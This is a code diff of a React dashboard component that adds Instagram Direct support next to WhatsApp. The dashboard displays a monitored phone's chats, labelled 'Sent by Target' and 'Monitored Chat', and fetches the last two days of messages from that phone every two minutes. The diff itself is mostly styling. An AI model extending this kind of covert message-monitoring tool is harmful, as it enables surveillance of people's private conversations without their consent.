-                                  {isChannelItem ? "Channel" : "WhatsApp Chat"}
+                                  {isInstagram ? "Instagram Direct" : isChannelItem ? "Channel" : "WhatsApp Chat"}
                                 </span>
                               </div>
                             </div>
@@ -1977,12 +2113,16 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
                         <div className="flex items-center gap-3 min-w-0">
                           <div
                             className={`w-9 h-9 rounded-full flex items-center justify-center font-bold text-sm shrink-0 shadow-xs text-white ${
-                              isWhatsAppChannel(selectedChatSummary)
+                              selectedApp === "instagram"
+                                ? "bg-gradient-to-tr from-yellow-400 via-pink-500 to-purple-600"
+                                : isWhatsAppChannel(selectedChatSummary)
                                 ? "bg-purple-600"
                                 : "bg-emerald-600"
                             }`}
                           >
-                            {isWhatsAppChannel(selectedChatSummary)
+                            {selectedApp === "instagram"
+                              ? selectedChatSummary.chatName.charAt(0).toUpperCase()
+                              : isWhatsAppChannel(selectedChatSummary)
                               ? "📢"
                               : selectedChatSummary.chatName.charAt(0).toUpperCase()}
                           </div>
@@ -1991,9 +2131,9 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
                               {selectedChatSummary.chatName}
                             </h3>
                             <p className="text-[10px] text-gray-400 flex items-center gap-1">
-                              <span className="w-1.5 h-1.5 rounded-full bg-emerald-500 inline-block" />
+                              <span className={`w-1.5 h-1.5 rounded-full inline-block ${selectedApp === "instagram" ? "bg-pink-500" : "bg-emerald-500"}`} />
                               <span className="truncate">
-                                {selectedChatSummary.subtitle || "WhatsApp Chat"} • Conversation Activity
+                                {selectedChatSummary.subtitle || (selectedApp === "instagram" ? "Instagram Direct" : "WhatsApp Chat")} • Conversation Activity
                               </span>
                             </p>
                           </div>
@@ -2005,7 +2145,11 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
                             id="btn-header-sync-now"
                             onClick={handleManualSyncNow}
                             disabled={requestingChat === selectedChatSummary.chatName}
-                            className="text-xs font-semibold px-2.5 py-1 bg-gradient-to-r from-emerald-600 to-teal-700 hover:from-emerald-700 hover:to-teal-800 text-white rounded-lg transition flex items-center gap-1.5 shadow-xs disabled:opacity-60"
+                            className={`text-xs font-semibold px-2.5 py-1 text-white rounded-lg transition flex items-center gap-1.5 shadow-xs disabled:opacity-60 ${
+                              selectedApp === "instagram"
+                                ? "bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-700 hover:to-pink-700"
+                                : "bg-gradient-to-r from-emerald-600 to-teal-700 hover:from-emerald-700 hover:to-teal-800"
+                            }`}
                             title="Send request to mobile application to get chat contents for last 2 days"
                           >
                             <span className={requestingChat === selectedChatSummary.chatName ? "animate-spin" : ""}>
@@ -2039,7 +2183,11 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
                               All ({selectedChatSummary.totalMessages})
                             </button>
                           </div>
-                          <span className="text-[10px] font-semibold px-2.5 py-0.5 rounded-full border bg-emerald-50 text-emerald-700 border-emerald-200">
+                          <span className={`text-[10px] font-semibold px-2.5 py-0.5 rounded-full border ${
+                            selectedApp === "instagram"
+                              ? "bg-pink-50 text-pink-700 border-pink-200"
+                              : "bg-emerald-50 text-emerald-700 border-emerald-200"
+                          }`}>
                             {activeThreadMessages.length} msgs
                           </span>
                         </div>
@@ -2050,7 +2198,9 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
                         <div className="flex items-center gap-2.5 min-w-0">
                           <span
                             className={`w-2.5 h-2.5 rounded-full shrink-0 ${
-                              autoSyncEnabled ? "bg-emerald-400 animate-pulse ring-2 ring-emerald-400/30" : "bg-gray-400"
+                              autoSyncEnabled
+                                ? selectedApp === "instagram" ? "bg-pink-400 animate-pulse ring-2 ring-pink-400/30" : "bg-emerald-400 animate-pulse ring-2 ring-emerald-400/30"
+                                : "bg-gray-400"
                             }`}
                           />
                           <div className="flex flex-wrap items-center gap-2 min-w-0">
@@ -2063,6 +2213,8 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
                                   ? "bg-slate-800 text-slate-400 border border-slate-700"
                                   : countdownSeconds <= 15
                                   ? "bg-amber-500/20 text-amber-300 border border-amber-500/40 animate-pulse"
+                                  : selectedApp === "instagram"
+                                  ? "bg-pink-500/20 text-pink-300 border border-pink-500/30"
                                   : "bg-emerald-500/20 text-emerald-300 border border-emerald-500/30"
                               }`}
                             >
@@ -2082,7 +2234,11 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
                             id="btn-auto-sync-now"
                             onClick={handleManualSyncNow}
                             disabled={requestingChat === selectedChatSummary.chatName}
-                            className="px-2.5 py-1 bg-gradient-to-r from-emerald-500 to-teal-600 hover:from-emerald-600 hover:to-teal-700 text-white rounded-md text-xs font-bold transition flex items-center gap-1 shadow-sm disabled:opacity-50"
+                            className={`px-2.5 py-1 text-white rounded-md text-xs font-bold transition flex items-center gap-1 shadow-sm disabled:opacity-50 ${
+                              selectedApp === "instagram"
+                                ? "bg-gradient-to-r from-purple-500 to-pink-600 hover:from-purple-600 hover:to-pink-700"
+                                : "bg-gradient-to-r from-emerald-500 to-teal-600 hover:from-emerald-600 hover:to-teal-700"
+                            }`}
                             title="Immediately dispatch fetch request to mobile phone and reset 2-minute timer"
                           >
                             <span className={requestingChat === selectedChatSummary.chatName ? "animate-spin" : ""}>
@@ -2118,8 +2274,8 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
                               <span className="flex h-2 w-2 relative">
                                 {syncProgress.status === "running" ? (
                                   <>
-                                    <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>
-                                    <span className="relative inline-flex rounded-full h-2 w-2 bg-emerald-500"></span>
+                                    <span className={`animate-ping absolute inline-flex h-full w-full rounded-full opacity-75 ${selectedApp === "instagram" ? "bg-pink-400" : "bg-emerald-400"}`}></span>
+                                    <span className={`relative inline-flex rounded-full h-2 w-2 ${selectedApp === "instagram" ? "bg-pink-500" : "bg-emerald-500"}`}></span>
                                   </>
                                 ) : syncProgress.status === "error" ? (
                                   <span className="relative inline-flex rounded-full h-2 w-2 bg-rose-500"></span>
@@ -2130,11 +2286,15 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
                                 )}
                               </span>
                               <span className="text-[11px] font-semibold text-slate-200 truncate">
-                                Syncing: <span className="text-emerald-400 font-bold">{syncProgress.chatName}</span>
+                                Syncing: <span className={selectedApp === "instagram" ? "text-pink-400 font-bold" : "text-emerald-400 font-bold"}>{syncProgress.chatName}</span>
                               </span>
                             </div>
                             <div className="flex items-center gap-2 shrink-0">
-                              <span className="text-[10px] font-mono font-bold text-emerald-400 bg-emerald-950/60 border border-emerald-500/30 px-1.5 py-0.5 rounded">
+                              <span className={`text-[10px] font-mono font-bold px-1.5 py-0.5 rounded ${
+                                selectedApp === "instagram"
+                                  ? "text-pink-400 bg-pink-950/60 border border-pink-500/30"
+                                  : "text-emerald-400 bg-emerald-950/60 border border-emerald-500/30"
+                              }`}>
                                 {syncProgress.percent}%
                               </span>
                               <button
@@ -2150,19 +2310,19 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
 
                           {/* 4-Step Visual Milestones */}
                           <div className="grid grid-cols-4 gap-1 mb-1.5 text-[9px] font-medium">
-                            <div className={`flex items-center gap-1 px-1.5 py-0.5 rounded transition ${syncProgress.step >= 1 ? "bg-emerald-500/20 text-emerald-300 border border-emerald-500/40" : "bg-slate-800/60 text-slate-500"}`}>
+                            <div className={`flex items-center gap-1 px-1.5 py-0.5 rounded transition ${syncProgress.step >= 1 ? (selectedApp === "instagram" ? "bg-pink-500/20 text-pink-300 border border-pink-500/40" : "bg-emerald-500/20 text-emerald-300 border border-emerald-500/40") : "bg-slate-800/60 text-slate-500"}`}>
                               <span>📤</span>
                               <span className="truncate">1. Request</span>
                             </div>
-                            <div className={`flex items-center gap-1 px-1.5 py-0.5 rounded transition ${syncProgress.step >= 2 ? "bg-emerald-500/20 text-emerald-300 border border-emerald-500/40" : "bg-slate-800/60 text-slate-500"}`}>
+                            <div className={`flex items-center gap-1 px-1.5 py-0.5 rounded transition ${syncProgress.step >= 2 ? (selectedApp === "instagram" ? "bg-pink-500/20 text-pink-300 border border-pink-500/40" : "bg-emerald-500/20 text-emerald-300 border border-emerald-500/40") : "bg-slate-800/60 text-slate-500"}`}>
                               <span>📱</span>
                               <span className="truncate">2. Phone Rx</span>
                             </div>
-                            <div className={`flex items-center gap-1 px-1.5 py-0.5 rounded transition ${syncProgress.step >= 3 ? "bg-emerald-500/20 text-emerald-300 border border-emerald-500/40" : "bg-slate-800/60 text-slate-500"}`}>
+                            <div className={`flex items-center gap-1 px-1.5 py-0.5 rounded transition ${syncProgress.step >= 3 ? (selectedApp === "instagram" ? "bg-pink-500/20 text-pink-300 border border-pink-500/40" : "bg-emerald-500/20 text-emerald-300 border border-emerald-500/40") : "bg-slate-800/60 text-slate-500"}`}>
                               <span>💬</span>
                               <span className="truncate">3. Response</span>
                             </div>
-                            <div className={`flex items-center gap-1 px-1.5 py-0.5 rounded transition ${syncProgress.step >= 4 ? (syncProgress.status === "error" ? "bg-rose-500/20 text-rose-300 border border-rose-500/40" : "bg-emerald-500/20 text-emerald-300 border border-emerald-500/40") : "bg-slate-800/60 text-slate-500"}`}>
+                            <div className={`flex items-center gap-1 px-1.5 py-0.5 rounded transition ${syncProgress.step >= 4 ? (syncProgress.status === "error" ? "bg-rose-500/20 text-rose-300 border border-rose-500/40" : selectedApp === "instagram" ? "bg-pink-500/20 text-pink-300 border border-pink-500/40" : "bg-emerald-500/20 text-emerald-300 border border-emerald-500/40") : "bg-slate-800/60 text-slate-500"}`}>
                               <span>💾</span>
                               <span className="truncate">4. DB Ready</span>
                             </div>
@@ -2175,7 +2335,11 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
                                 syncProgress.status === "error"
                                   ? "bg-rose-500"
                                   : syncProgress.percent === 100
-                                  ? "bg-gradient-to-r from-emerald-500 via-teal-400 to-emerald-400"
+                                  ? selectedApp === "instagram"
+                                    ? "bg-gradient-to-r from-purple-500 via-pink-500 to-rose-400"
+                                    : "bg-gradient-to-r from-emerald-500 via-teal-400 to-emerald-400"
+                                  : selectedApp === "instagram"
+                                  ? "bg-gradient-to-r from-purple-500 via-pink-500 to-rose-400 animate-pulse"
                                   : "bg-gradient-to-r from-blue-500 via-teal-400 to-emerald-400 animate-pulse"
                               }`}
                               style={{ width: `${syncProgress.percent}%` }}
@@ -2186,30 +2350,40 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
                           <div className="mt-1 flex items-center justify-between text-[10px] text-slate-400 font-mono">
                             <span className="truncate">{syncProgress.detail}</span>
                             {syncProgress.status === "running" && (
-                              <span className="text-[10px] text-emerald-400 animate-pulse shrink-0 ml-2">Live Sync...</span>
+                              <span className={`text-[10px] animate-pulse shrink-0 ml-2 ${selectedApp === "instagram" ? "text-pink-400" : "text-emerald-400"}`}>Live Sync...</span>
                             )}
                           </div>
                         </div>
                       )}
-                      <div className="px-3.5 py-2 bg-gradient-to-r from-emerald-50 via-teal-50/70 to-emerald-50 border-b border-emerald-100 flex flex-wrap items-center justify-between gap-2 text-xs text-emerald-950 shrink-0 shadow-2xs">
+                      <div className={`px-3.5 py-2 border-b flex flex-wrap items-center justify-between gap-2 text-xs shrink-0 shadow-2xs ${
+                        selectedApp === "instagram"
+                          ? "bg-gradient-to-r from-purple-50 via-pink-50/70 to-rose-50 border-pink-100 text-purple-950"
+                          : "bg-gradient-to-r from-emerald-50 via-teal-50/70 to-emerald-50 border-emerald-100 text-emerald-950"
+                      }`}>
                         <div className="flex items-center gap-2 min-w-0">
-                          <span className="text-sm">📅</span>
+                          <span className="text-sm">{selectedApp === "instagram" ? "📸" : "📅"}</span>
                           <div className="flex flex-col sm:flex-row sm:items-center sm:gap-2 min-w-0">
-                            <span className="font-bold text-emerald-900 text-[11px]">
-                              Last 2 Days WhatsApp Chat Contents
+                            <span className={`font-bold text-[11px] ${selectedApp === "instagram" ? "text-purple-900" : "text-emerald-900"}`}>
+                              {selectedApp === "instagram"
+                                ? "Last 2 Days Instagram Direct Conversation (DMs, Reels & Media)"
+                                : "Last 2 Days WhatsApp Chat Contents"}
                             </span>
-                            <span className="hidden sm:inline text-emerald-300">•</span>
-                            <span className="text-[11px] text-emerald-800 truncate">
+                            <span className="hidden sm:inline text-gray-300">•</span>
+                            <span className={`text-[11px] truncate ${selectedApp === "instagram" ? "text-purple-800" : "text-emerald-800"}`}>
                               Dashboard Login:{" "}
-                              <strong className="font-semibold text-emerald-950">
+                              <strong className={`font-semibold ${selectedApp === "instagram" ? "text-purple-950" : "text-emerald-950"}`}>
                                 {formatMessageDateTime(dashboardLoginTime.toISOString())}
                               </strong>
                             </span>
                           </div>
                         </div>
                         <div className="flex items-center gap-1.5 shrink-0">
-                          <span className="text-[10px] font-semibold text-emerald-800 bg-white px-2 py-0.5 rounded-full border border-emerald-200 flex items-center gap-1 shadow-2xs">
-                            <span className="w-1.5 h-1.5 rounded-full bg-emerald-500 animate-pulse" />
+                          <span className={`text-[10px] font-semibold bg-white px-2 py-0.5 rounded-full border flex items-center gap-1 shadow-2xs ${
+                            selectedApp === "instagram"
+                              ? "text-pink-800 border-pink-200"
+                              : "text-emerald-800 border-emerald-200"
+                          }`}>
+                            <span className={`w-1.5 h-1.5 rounded-full animate-pulse ${selectedApp === "instagram" ? "bg-pink-500" : "bg-emerald-500"}`} />
                             Live Real-Time
                           </span>
                         </div>
@@ -2225,7 +2399,11 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
                           <div className="flex flex-col items-center justify-center py-8 px-4 text-center">
                             <div className="w-full max-w-sm bg-white rounded-2xl shadow-sm border border-gray-200/80 p-6 space-y-4">
                               {/* Avatar */}
-                              <div className="w-16 h-16 mx-auto rounded-full bg-gradient-to-br from-emerald-500 to-teal-600 flex items-center justify-center text-white text-2xl font-bold shadow-md">
+                              <div className={`w-16 h-16 mx-auto rounded-full flex items-center justify-center text-white text-2xl font-bold shadow-md ${
+                                selectedApp === "instagram"
+                                  ? "bg-gradient-to-tr from-yellow-400 via-pink-500 to-purple-600"
+                                  : "bg-gradient-to-br from-emerald-500 to-teal-600"
+                              }`}>
                                 {selectedChatSummary.chatName.charAt(0).toUpperCase()}
                               </div>
 
@@ -2239,9 +2417,13 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
                                     {selectedChatSummary.subtitle}
                                   </p>
                                 )}
-                                <span className="inline-flex items-center gap-1.5 mt-2 px-2.5 py-0.5 rounded-full text-[11px] font-semibold bg-emerald-50 text-emerald-700 border border-emerald-200">
-                                  <span className="w-1.5 h-1.5 rounded-full bg-emerald-500" />
-                                  WhatsApp Monitored Chat
+                                <span className={`inline-flex items-center gap-1.5 mt-2 px-2.5 py-0.5 rounded-full text-[11px] font-semibold border ${
+                                  selectedApp === "instagram"
+                                    ? "bg-pink-50 text-pink-700 border-pink-200"
+                                    : "bg-emerald-50 text-emerald-700 border-emerald-200"
+                                }`}>
+                                  <span className={`w-1.5 h-1.5 rounded-full ${selectedApp === "instagram" ? "bg-pink-500" : "bg-emerald-500"}`} />
+                                  {selectedApp === "instagram" ? "Instagram Direct Monitored Chat" : "WhatsApp Monitored Chat"}
                                 </span>
                               </div>
 
@@ -2266,7 +2448,11 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
                                 </div>
                               </div>
 
-                              <div className="bg-emerald-50/50 rounded-xl p-3 text-[11px] text-emerald-800/80 leading-relaxed text-left border border-emerald-100/60">
+                              <div className={`rounded-xl p-3 text-[11px] leading-relaxed text-left border ${
+                                selectedApp === "instagram"
+                                  ? "bg-pink-50/50 text-pink-900/80 border-pink-100/60"
+                                  : "bg-emerald-50/50 text-emerald-800/80 border-emerald-100/60"
+                              }`}>
                                 💡 Shows conversation contents from the last 2 days. The dashboard automatically requests new messages from the mobile phone every 2 minutes, or you can click below to sync now.
                               </div>
 
@@ -2274,7 +2460,11 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
                                 type="button"
                                 onClick={handleManualSyncNow}
                                 disabled={requestingChat === selectedChatSummary.chatName}
-                                className="w-full py-2 bg-gradient-to-r from-emerald-600 to-teal-700 hover:from-emerald-700 hover:to-teal-800 text-white rounded-lg text-xs font-semibold transition flex items-center justify-center gap-1.5 shadow-xs disabled:opacity-60"
+                                className={`w-full py-2 text-white rounded-lg text-xs font-semibold transition flex items-center justify-center gap-1.5 shadow-xs disabled:opacity-60 ${
+                                  selectedApp === "instagram"
+                                    ? "bg-gradient-to-r from-purple-600 via-pink-600 to-rose-600 hover:opacity-95"
+                                    : "bg-gradient-to-r from-emerald-600 to-teal-700 hover:from-emerald-700 hover:to-teal-800"
+                                }`}
                               >
                                 <span className={requestingChat === selectedChatSummary.chatName ? "animate-spin" : ""}>
                                   {requestingChat === selectedChatSummary.chatName ? "↻" : "⚡"}
@@ -2290,7 +2480,7 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
                                 <button
                                   type="button"
                                   onClick={() => setTimeFilter("all")}
-                                  className="text-emerald-700 font-semibold underline text-[11px] block mx-auto pt-1"
+                                  className={`font-semibold underline text-[11px] block mx-auto pt-1 ${selectedApp === "instagram" ? "text-pink-700" : "text-emerald-700"}`}
                                 >
                                   Show all stored messages ({selectedChatSummary.totalMessages}) →
                                 </button>
@@ -2310,6 +2500,7 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
                               {/* Chat Speech Bubbles - SENDER (Target) vs RECEIVER (Contact) */}
                               {group.items.map((m) => {
                                 const isTargetSent = m.isOutgoing;
+                                const isInstagramMsg = selectedApp === "instagram";
                                 return (
                                   <div
                                     key={m.id}
@@ -2317,7 +2508,11 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
                                   >
                                     <div
                                       className={`max-w-[85%] sm:max-w-[78%] md:max-w-[72%] rounded-2xl px-4 py-2.5 shadow-xs space-y-1 text-xs relative ${
-                                        isTargetSent
+                                        isInstagramMsg
+                                          ? isTargetSent
+                                            ? "bg-gradient-to-r from-purple-600 via-pink-600 to-rose-500 text-white rounded-br-xs shadow-sm"
+                                            : "bg-white text-gray-900 rounded-bl-xs border border-gray-200"
+                                          : isTargetSent
                                           ? "bg-[#d9fdd3] text-gray-900 rounded-br-xs border border-emerald-300/60"
                                           : "bg-white text-gray-900 rounded-bl-xs border border-gray-200"
                                       }`}
@@ -2325,7 +2520,11 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
                                       {/* Verification Header: Sent by Target vs Received from Contact */}
                                       <div
                                         className={`flex items-center justify-between gap-3 pb-1 border-b text-[10px] ${
-                                          isTargetSent
+                                          isInstagramMsg
+                                            ? isTargetSent
+                                              ? "border-white/20 text-white/90"
+                                              : "border-gray-100 text-gray-700"
+                                            : isTargetSent
                                             ? "border-emerald-600/10 text-emerald-800"
                                             : "border-gray-100 text-gray-700"
                                         }`}
@@ -2340,7 +2539,11 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
                                         </span>
                                         <span
                                           className={`text-[9px] font-semibold px-2 py-0.5 rounded-full shrink-0 border ${
-                                            isTargetSent
+                                            isInstagramMsg
+                                              ? isTargetSent
+                                                ? "bg-white/20 text-white border-white/30"
+                                                : "bg-pink-50 text-pink-800 border-pink-200"
+                                              : isTargetSent
                                               ? "bg-emerald-100/90 text-emerald-800 border-emerald-200"
                                               : "bg-sky-50 text-sky-800 border-sky-200"
                                           }`}
@@ -2348,6 +2551,51 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
                                           {isTargetSent ? "Sent by Target" : "Received from Contact"}
                                         </span>
                                       </div>
+
+                                      {/* Instagram Reel Link Card */}
+                                      {m.reelUrl && (
+                                        <div className={`my-2 p-2.5 rounded-xl border space-y-2 shadow-xs ${
+                                          isInstagramMsg && isTargetSent
+                                            ? "bg-black/20 border-white/30 text-white"
+                                            : "bg-gradient-to-br from-purple-50 via-pink-50 to-rose-50 border-pink-200 text-gray-900"
+                                        }`}>
+                                          <div className="flex items-center justify-between gap-2">
+                                            <span className={`inline-flex items-center gap-1 text-[11px] font-bold px-2 py-0.5 rounded-full ${
+                                              isInstagramMsg && isTargetSent ? "bg-white/20 text-white" : "bg-pink-100 text-pink-700"
+                                            }`}>
+                                              <span>🎬</span>
+                                              <span>Instagram Reel</span>
+                                            </span>
+                                            <a
+                                              href={m.reelUrl}
+                                              target="_blank"
+                                              rel="noreferrer noopener"
+                                              className={`inline-flex items-center gap-1 text-[11px] font-bold px-3 py-1 rounded-lg shadow-xs transition transform hover:scale-[1.02] ${
+                                                isInstagramMsg && isTargetSent
+                                                  ? "bg-white text-purple-700 hover:bg-gray-100"
+                                                  : "bg-gradient-to-r from-purple-600 to-pink-600 text-white hover:from-purple-700 hover:to-pink-700"
+                                              }`}
+                                            >
+                                              <span>Watch Reel</span>
+                                              <span>↗</span>
+                                            </a>
+                                          </div>
+                                          <div className={`text-[11px] font-mono break-all p-2 rounded-lg border ${
+                                            isInstagramMsg && isTargetSent
+                                              ? "bg-black/30 border-white/20 text-pink-200"
+                                              : "bg-white/90 border-pink-200/60 text-pink-700"
+                                          }`}>
+                                            <a
+                                              href={m.reelUrl}
+                                              target="_blank"
+                                              rel="noreferrer noopener"
+                                              className="hover:underline font-semibold"
+                                            >
+                                              {m.reelUrl}
+                                            </a>
+                                          </div>
+                                        </div>
+                                      )}
 
                                       {/* Media: Audio Voice Note */}
                                       {m.mediaType === "audio" && (
@@ -2381,9 +2629,17 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
                                               />
                                             </div>
                                           ) : (
-                                            <div className="rounded-xl p-3 bg-emerald-500/10 border border-emerald-500/20 space-y-1.5 my-1">
+                                            <div className={`rounded-xl p-3 border space-y-1.5 my-1 ${
+                                              isInstagramMsg
+                                                ? isTargetSent
+                                                  ? "bg-white/10 border-white/20 text-white"
+                                                  : "bg-pink-500/10 border-pink-500/20 text-pink-900"
+                                                : isTargetSent
+                                                ? "bg-emerald-600/10 border-emerald-600/20 text-emerald-950"
+                                                : "bg-emerald-500/10 border-emerald-500/20 text-emerald-900"
+                                            }`}>
                                               <div className="flex items-center justify-between gap-3">
-                                                <span className="font-semibold text-xs flex items-center gap-1.5 text-emerald-900">
+                                                <span className="font-semibold text-xs flex items-center gap-1.5">
                                                   <span className="text-base">📷</span>
                                                   <span>Photo Attachment</span>
                                                 </span>
@@ -2391,14 +2647,16 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
                                                   <button
                                                     type="button"
                                                     onClick={() => handleDownloadMedia(m.mediaPath!, "photo.jpg")}
-                                                    className="text-[10px] bg-emerald-600 hover:bg-emerald-700 text-white font-medium px-2 py-0.5 rounded transition"
+                                                    className={`text-[10px] text-white font-medium px-2 py-0.5 rounded transition ${
+                                                      isInstagramMsg ? "bg-pink-600 hover:bg-pink-700" : "bg-emerald-600 hover:bg-emerald-700"
+                                                    }`}
                                                   >
                                                     Download ⬇
                                                   </button>
                                                 )}
                                               </div>
                                               {m.mediaPath && (
-                                                <p className="text-[10px] text-gray-500 font-mono truncate">{m.mediaPath}</p>
+                                                <p className={`text-[10px] font-mono truncate ${isInstagramMsg && isTargetSent ? "text-white/70" : "text-gray-500"}`}>{m.mediaPath}</p>
                                               )}
                                             </div>
                                           )}
@@ -2406,19 +2664,26 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
                                       )}
 
                                       {/* Message Text Content */}
-                                      <p className="whitespace-pre-wrap break-words leading-relaxed text-[13px] text-gray-900 select-text font-normal">
+                                      <p className={`whitespace-pre-wrap break-words leading-relaxed text-[13px] select-text font-normal ${
+                                        isInstagramMsg && isTargetSent ? "text-white" : "text-gray-900"
+                                      }`}>
                                         {m.text}
                                       </p>
 
                                       {/* Message Footer: Timestamp & Delivery Status */}
                                       <div
                                         className={`flex items-center justify-end gap-1.5 text-[10px] pt-1 font-medium ${
-                                          isTargetSent ? "text-emerald-800/80" : "text-gray-400"
+                                          isInstagramMsg
+                                            ? isTargetSent ? "text-white/80" : "text-gray-400"
+                                            : isTargetSent ? "text-emerald-800/80" : "text-gray-400"
                                         }`}
                                       >
                                         <span>{formatMessageTime(m.timestamp)}</span>
                                         {isTargetSent && (
-                                          <span className="text-[#34b7f1] font-bold text-[11px] tracking-tighter" title="Sent by Target (Delivered)">
+                                          <span
+                                            className={isInstagramMsg ? "text-white font-bold text-[11px]" : "text-[#34b7f1] font-bold text-[11px]"}
+                                            title="Sent by Target (Delivered)"
+                                          >
                                             ✓✓
                                           </span>
                                         )}
